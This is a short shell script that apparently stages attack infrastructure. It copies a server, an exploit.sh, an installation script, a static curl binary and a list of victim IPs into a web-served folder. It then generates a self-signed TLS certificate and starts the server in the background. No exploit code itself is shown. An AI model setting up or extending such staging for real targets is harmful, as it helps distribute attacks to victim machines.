#!/bin/sh

cp client www/
cp downloaded/openssl_conf www/
cp downloaded/server server
cp downloaded/server www/
cp downloaded/error_file www/
cp downloaded/exploit.sh www/
cp downloaded/installation.sh www/
cp downloaded/ip_addr conf/ip_serv
cp downloaded/ip_victims conf/
cp downloaded/curl-amd64 www/

openssl genrsa -out conf/privkey.pem 4096
openssl req -key conf/privkey.pem -new -config www/openssl_conf -out conf/certs.pem
openssl x509 -signkey conf/privkey.pem -in conf/certs.pem -req -days 356 -out conf/certs.pem


./server & disown # TODO: Active that before putting in prod or the serv won't active.
